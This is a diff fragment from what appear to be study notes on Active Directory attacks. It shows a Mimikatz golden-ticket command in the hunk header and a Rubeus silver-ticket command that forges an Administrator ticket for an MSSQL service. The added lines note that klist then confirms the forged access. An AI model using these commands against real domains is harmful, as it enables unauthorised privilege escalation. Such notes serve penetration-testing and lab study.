@@ -407,3 +407,6 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 - Attackkkkkk
 - We can also use rubeus for this attack.
   - `rubeus.exe silver /service:MSSQLSvc/kerbdc1.kerb.local:1433 /rc4:<RC4 hash> /sid:<SID of Domain> /user:Administrator /domain:kerb.local /ptt`
+  - Ticket will be successfully imported.
+  - `klist`
+  - It will show that it is a Administrator but only for the service MSSQL.
